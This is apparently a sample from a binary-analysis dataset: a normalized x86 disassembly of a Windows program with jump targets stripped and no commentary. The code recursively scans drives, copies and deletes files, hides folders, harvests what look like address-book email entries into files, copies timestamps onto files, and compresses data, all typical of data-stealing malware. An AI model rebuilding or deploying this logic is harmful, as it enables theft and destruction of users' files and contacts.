push 0x5c
push eax
call [ strrchr@IAT ]
push rw-data
push eax
call strcmp
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x6c4 ]
push eax
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
jne r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x8c4 ]
push 0x1
push eax
lea eax [ ebp - 0x3c4 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x3c4 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x198 ]
push eax
call sub_402b8b
test eax eax
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x3c4 ]
push eax
push [ ebp + 0xc ]
call sub_401b25
pop ecx
pop ecx
jmp r-xdata
sub_402530
push rw-data
call sub_402bde
mov [ esp ] rw-data
call sub_402bde
push 0x5c
push [ esp + 0xc ]
call [ strrchr@IAT ]
add esp 0xc
test eax eax
je r-xdata
push [ esp + 0x4 ]
call sub_402567
pop ecx
retn
and [ eax ] 0x0
sub_402567
push ebp
mov ebp esp
sub esp 0x640
push esi
mov esi [ sprintf@IAT ]
push edi
lea eax [ ebp - 0x640 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x640 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push 0x1
pop eax
lea eax [ ebp - 0x140 ]
push eax
call sub_402aeb
test eax eax
pop ecx
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x240 ]
push eax
call strcpy
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x440 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call esi
add esp 0x18
test [ ebp - 0x140 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0x140 ]
push eax
call sub_402b21
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x440 ]
push eax
call sub_402567
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x440 ]
push eax
push rw-data
call sub_401b25
pop ecx
pop ecx
push edi
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
jmp r-xdata
pop edi
pop esi
leave
retn
sub_40265a
push ebp
mov ebp esp
sub esp 0x558
push esi
mov esi [ sprintf@IAT ]
push edi
lea eax [ ebp - 0x558 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x158 ]
push eax
lea eax [ ebp - 0x558 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call [ RemoveDirectoryA@IAT ]
push 0x1
pop eax
cmp [ ebp - 0x12c ] 0x2e
je r-xdata
lea eax [ ebp - 0x158 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x12c ]
push eax
lea eax [ ebp - 0x358 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call esi
add esp 0x10
test [ ebp - 0x158 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
add [ ebp - 0x8 ] 0x79b8000
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
adc [ ebp - 0x4 ] 0xffffe86d
call [ CompareFileTime@IAT ]
test eax eax
jge r-xdata
lea eax [ ebp - 0x358 ]
push eax
call sub_40265a
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x358 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x358 ]
push eax
call [ DeleteFileA@IAT ]
push edi
call [ FindClose@IAT ]
xor eax eax
jmp r-xdata
jmp r-xdata
pop edi
pop esi
leave
retn
sub_402772
push ebp
mov ebp esp
sub esp 0x254
push ebx
push esi
push rw-data
push [ ebp + 0x8 ]
call [ strstr@IAT ]
pop ecx
xor ebx ebx
test eax eax
pop ecx
jne r-xdata
push 0x44
lea eax [ ebp - 0x54 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x24 ] bx
push eax
lea eax [ ebp - 0x54 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ ebp + 0x8 ]
push ebx
call [ CreateProcessA@IAT ]
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x254 ]
push eax
call strcpy
mov esi [ strchr@IAT ]
lea eax [ ebp - 0x254 ]
push 0x22
push eax
call esi
add esp 0x10
cmp eax ebx
je r-xdata
inc eax
push 0x22
push eax
call esi
pop ecx
cmp eax ebx
pop ecx
je r-xdata
mov [ eax ] bl
lea eax [ ebp - 0x254 ]
push 0x5c
push eax
call [ strrchr@IAT ]
pop ecx
cmp eax ebx
pop ecx
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] bl
mov [ eax + 0x1 ] bl
jmp r-xdata
lea eax [ ebp - 0x253 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_40282d
push ebp
mov ebp esp
sub esp 0x204
push ebx
push esi
push edi
mov ebx rw-data
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
cmp [ ebp - 0x204 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_402a2d
call sub_402a98
lea eax [ ebp - 0x204 ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push eax
call sub_402530
lea eax [ ebp - 0x204 ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push eax
call sub_402530
lea eax [ ebp - 0x204 ]
push ebx
push eax
call strcpy
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push eax
call sub_402530
add esp 0x3c
lea eax [ ebp - 0x204 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
lea esi [ ebp + eax - 0x204 ]
push esi
call strlen
mov edi eax
movsx eax [ esi ]
push eax
inc edi
call [ toupper@IAT ]
pop ecx
cmp eax 0x43
pop ecx
jl r-xdata
add [ ebp - 0x4 ] edi
mov eax [ ebp - 0x4 ]
cmp [ ebp + eax - 0x204 ] 0x0
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x5
je r-xdata
push esi
call sub_402530
pop ecx
sub_402973
push ebp
mov ebp esp
sub esp 0x148
push ebx
push esi
push rw-data
push rw-data
xor bl bl
call [ fopen@IAT ]
pop ecx
mov [ ebp - 0x8 ] eax
test eax eax
pop ecx
je r-xdata
pop esi
pop ebx
leave
retn
movsx eax bl
shl eax 0x4
lea esi [ ebp + eax - 0x148 ]
push esi
push rw-data
push [ ebp - 0x8 ]
call [ fscanf@IAT ]
add esp 0xc
cmp eax 0xffffffff
je r-xdata
test bl bl
je r-xdata
push esi
call strlen
cmp eax 0x10
pop ecx
ja r-xdata
and [ ebp - 0x4 ] 0x0
push edi
movsx edi bl
xor esi esi
push esi
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
push rw-data
lea eax [ ebp + esi - 0x148 ]
push eax
jmp r-xdata
inc bl
cmp bl 0x14
jl r-xdata
cmp [ ebp - 0x4 ] edi
jge r-xdata
push [ ebp - 0x8 ]
call [ fclose@IAT ]
pop ecx
pop edi
lea eax [ esi + rw-data ]
push eax
call strcpy
inc [ ebp - 0x4 ]
add esi 0x10
pop ecx
cmp esi 0x140
pop ecx
jl r-xdata
sub_402a2d
push ebp
mov ebp esp
sub esp 0x10
push esi
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x10 ]
push rw-data
push eax
call [ SystemTimeToFileTime@IAT ]
add [ rw-data ] 0x79b8000
adc [ rw-data ] 0xffffe86d
push esi
push 0x1
push 0x8
push rw-data
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
jmp r-xdata
pop esi
leave
retn
sub_402a98
push ebp
mov ebp esp
sub esp 0x18
push esi
push rw-data
push rw-data
call [ fopen@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x18 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ SystemTimeToFileTime@IAT ]
push esi
push 0x1
lea eax [ ebp - 0x8 ]
push 0x8
push eax
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
sub_402aeb
mov eax [ esp + 0x4 ]
push esi
push edi
cmp [ eax + 0x2c ] 0x2e
lea esi [ eax + 0x2c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edi rw-data
pop edi
pop esi
retn
add edi 0x4
cmp edi rw-data
jl r-xdata
push [ edi ]
push esi
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
xor eax eax
sub_402b21
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push rw-data
lea eax [ esi + 0x14 ]
push eax
call [ CompareFileTime@IAT ]
test eax eax
jl r-xdata
xor eax eax
add esi 0x2c
push 0x2e
push esi
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
test ebx ebx
je r-xdata
push rw-data
push esi
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
sub_402b8b
push ebx
push esi
push edi
push 0x2e
push [ esp + 0x14 ]
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
pop ecx
pop ecx
mov ebx eax
mov esi rw-data
xor eax eax
test ebx ebx
je r-xdata
push rw-data
push esi
lea eax [ esi + 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
add esi 0x10
cmp esi rw-data
jl r-xdata
call edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
sub_402bde
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_402bff
push ebp
mov ebp esp
sub esp 0x360
push ebx
push esi
push edi
push 0xa
pop ecx
mov esi rw-data
lea edi [ ebp - 0x60 ]
mov al [ rw-data ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov [ ebp - 0x60 ] al
lea eax [ ebp - 0x60 ]
xor ebx ebx
push eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
nop
nop
nop
nop
nop
nop
nop
nop
push rw-data
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
push ebx
lea ecx [ ebp - 0x18 ]
push ebx
push ecx
lea ecx [ ebp - 0x14 ]
push ecx
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x24 ]
push edx
lea edx [ ebp - 0x1c ]
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0x64 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
push edx
lea edx [ ebp - 0x8 ]
push edx
mov ecx [ eax ]
push 0x10
push ebx
push [ ebp - 0x24 ]
push [ ebp - 0x1c ]
push eax
call [ ecx + 0x38 ]
cmp [ ebp - 0x8 ] 0x4
jne r-xdata
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
push edx
push ebx
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x30 ]
push edx
push ebx
push eax
call [ ecx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x10 ]
push edx
push ebx
push [ ebp - 0x30 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
mov eax [ ebp - 0x10 ]
xor ecx ecx
cmp [ eax ] ebx
jbe r-xdata
mov ecx [ ebp - 0x18 ]
push eax
push ecx
mov edx [ ecx ]
call [ edx + 0x18 ]
mov [ ebp - 0x20 ] ebx
mov ebx [ sprintf@IAT ]
lea eax [ ebp - 0x360 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x360 ]
push eax
push rw-data
call sub_402e53
mov eax [ ebp - 0x18 ]
add esp 0x10
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x34 ]
add [ ebp - 0x20 ] 0xc
cmp ecx [ eax ]
jb r-xdata
mov [ ebp - 0x2c ] eax
mov edx [ ebp - 0x20 ]
inc ecx
push ecx
push rw-data
lea edi [ edx + eax + 0x4 ]
lea eax [ ebp - 0x360 ]
push eax
mov [ ebp - 0x34 ] ecx
call ebx
xor eax eax
add esp 0xc
cmp [ edi + 0x4 ] eax
mov [ ebp - 0x28 ] eax
jbe r-xdata
cmp [ esi ] 0x3003001e
jne r-xdata
push [ esi + 0x8 ]
lea eax [ ebp - 0xe0 ]
push rw-data
push eax
call ebx
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x360 ]
push eax
call strcat
add esp 0x14
cmp [ esi ] 0x3a4f001e
jne r-xdata
push [ esi + 0x8 ]
lea eax [ ebp - 0xe0 ]
push rw-data
push eax
call ebx
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x360 ]
push eax
call strcat
add esp 0x14
cmp [ esi ] 0x3002001e
jne r-xdata
push [ esi + 0x8 ]
lea eax [ ebp - 0xe0 ]
push rw-data
push eax
call ebx
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x360 ]
push eax
call strcat
add esp 0x14
inc [ ebp - 0x28 ]
add [ ebp - 0x2c ] 0x10
mov eax [ ebp - 0x28 ]
cmp eax [ edi + 0x4 ]
jb r-xdata
push [ esi + 0x8 ]
lea eax [ ebp - 0xe0 ]
push rw-data
push eax
call ebx
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0x360 ]
push eax
call strcat
add esp 0x14
mov esi [ ebp - 0x2c ]
add esi [ edi + 0x8 ]
cmp [ esi ] 0x3001001e
jne r-xdata
sub_402e53
push esi
push rw-data
push [ esp + 0xc ]
call [ fopen@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop esi
retn
push esi
push [ esp + 0x10 ]
call strlen
pop ecx
push eax
push 0x1
push [ esp + 0x18 ]
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x14
sub_402e8f
push ebp
mov ebp esp
sub esp 0x10c
lea eax [ ebp - 0x4 ]
push esi
push eax
call [ SHGetMalloc@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax esi
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push 0x0
call [ SHGetSpecialFolderLocation@IAT ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x8 ]
call [ SHGetPathFromIDListA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
lea eax [ ebp - 0x10c ]
push eax
call strlen
mov esi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
inc eax
pop ecx
cmp [ ebp + 0xc ] eax
pop ecx
jae r-xdata
lea eax [ ebp - 0x10c ]
push eax
push [ ebp + 0x8 ]
call strcpy
pop ecx
pop ecx
jmp r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
pop esi
leave
retn
sub_402f26
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
push edi
mov esi [ CreateFileA@IAT ]
push 0x2000000
push 0x3
push edi
push 0x5
push 0x80000000
push [ ebp + 0x8 ]
call esi
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
push 0x80
push 0x3
push edi
push edi
push 0x40000000
push [ ebp + 0xc ]
call esi
mov edi eax
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetFileTime@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ SetFileTime@IAT ]
mov esi [ CloseHandle@IAT ]
push ebx
call esi
push edi
call esi
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
sub_402fae
push ebp
mov ebp esp
sub esp 0x804
lea eax [ ebp + 0xc ]
push esi
push eax
xor esi esi
push 0xf003f
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x800
push [ ebp + 0x8 ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x804 ]
push eax
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn
push edi
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
mov edi rw-data
mov esi rw-data
push edi
push esi
call sub_402e53
lea eax [ ebp - 0x804 ]
push eax
push esi
call sub_402e53
push edi
push esi
call sub_402e53
add esp 0x18
push 0x1
pop eax
pop edi
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
sub_403040
push ebp
mov ebp esp
sub esp 0x40
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x3c ] eax
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x38 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x2c ]
cmp eax [ edx ]
je r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
push 0x38
push rw-data
mov ecx [ ebp + 0x18 ]
push ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_403130
add esp 0x10
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0xfffffffb
jmp r-xdata
push 0x4
lea eax [ ebp - 0x3c ]
push eax
call sub_4037ce
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
lea edx [ ebp - 0x3c ]
push edx
call sub_403c65
add esp 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x3c ]
push ecx
call sub_403c65
add esp 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x40 ] 0xfffffffb
jmp r-xdata
mov eax [ ebp - 0x40 ]
jmp r-xdata
sub_403109
push ebp
mov ebp esp
push 0xffffffff
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403040
add esp 0x14
pop ebp
retn
sub_403130
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
push 0x0
push 0x8
push 0xf
push 0x8
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403155
add esp 0x20
pop ebp
retn
sub_403155
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov eax [ ebp + 0x20 ]
movsx ecx [ eax ]
mov edx [ rw-data ]
movsx eax [ edx ]
cmp ecx eax
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0x24 ] 0x38
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] sub_40555e
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x28 ] 0x0
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24 ] sub_405587
cmp [ ebp + 0x14 ] 0x0
jge r-xdata
mov [ ebp + 0xc ] 0x6
cmp [ ebp + 0x18 ] 0x1
jl r-xdata
mov [ ebp - 0xc ] 0x1
mov ecx [ ebp + 0x14 ]
neg ecx
mov [ ebp + 0x14 ] ecx
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x18 ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x8
jne r-xdata
cmp [ ebp + 0x14 ] 0x8
jl r-xdata
cmp [ ebp + 0x14 ] 0xf
jg r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x9
jg r-xdata
cmp [ ebp + 0x1c ] 0x0
jl r-xdata
cmp [ ebp + 0x1c ] 0x2
jle r-xdata
push 0x16b8
push 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ edx + 0x28 ] eax
mov ecx [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ ecx + 0x28 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x24 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp + 0x18 ]
add ecx 0x7
mov edx [ ebp - 0x8 ]
mov [ edx + 0x48 ] ecx
mov eax [ ebp - 0x8 ]
mov edx 0x1
mov ecx [ eax + 0x48 ]
shl edx cl
mov eax [ ebp - 0x8 ]
mov [ eax + 0x44 ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x44 ]
sub edx 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4c ] edx
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x48 ]
add eax 0x2
xor edx edx
mov ecx 0x3
div ecx
mov edx [ ebp - 0x8 ]
mov [ edx + 0x50 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x30 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x24 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x38 ] eax
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x44 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call [ ecx + 0x20 ]
add esp 0xc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x3c ] eax
mov ecx [ ebp + 0x18 ]
add ecx 0x6
mov eax 0x1
shl eax cl
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1694 ] eax
push 0x4
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x1694 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
call [ eax + 0x20 ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403c65
add esp 0x4
mov eax 0xfffffffc
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x38 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx + 0x1694 ]
shr edx 0x1
mov eax [ ebp - 0x4 ]
lea ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x169c ] ecx
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x1694 ]
imul ecx ecx 0x3
mov edx [ ebp - 0x8 ]
mov eax [ edx + 0x8 ]
add eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x1690 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx + 0x7c ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x1c ]
mov [ ecx + 0x80 ] edx
mov eax [ ebp - 0x8 ]
mov cl [ ebp + 0x10 ]
mov [ eax + 0x1d ] cl
mov edx [ ebp + 0x8 ]
push edx
call sub_4035e1
add esp 0x4
sub_403441
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
cmp [ eax + 0x4 ] 0x2a
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
push eax
call sub_4055a0
add esp 0xc
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x30 ] eax
cmp [ ebp - 0x8 ] 0x3
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp [ ebp - 0x8 ] eax
jbe r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x64 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x54 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x30 ]
xor eax eax
mov al [ edx ]
